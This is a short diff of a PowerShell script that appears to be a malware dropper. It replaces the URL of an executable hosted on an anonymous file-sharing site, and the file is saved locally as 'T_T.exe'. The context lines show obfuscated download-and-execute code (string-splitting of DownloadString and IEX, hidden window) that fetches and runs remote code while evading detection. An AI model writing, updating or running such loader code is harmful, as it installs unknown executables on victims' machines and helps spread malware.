@@ -111,7 +111,7 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 # $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 # Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$url = "https://anonsharing.com/file/3bcedc688a307967/rc_(2).exe"
+$url = "https://anonsharing.com/file/efaac0ebb2c760d9/H-Output.exe"
 $output = "$dir\T_T.exe"
 if (Test-Path -Path $output) {
     Write-Host "hello"
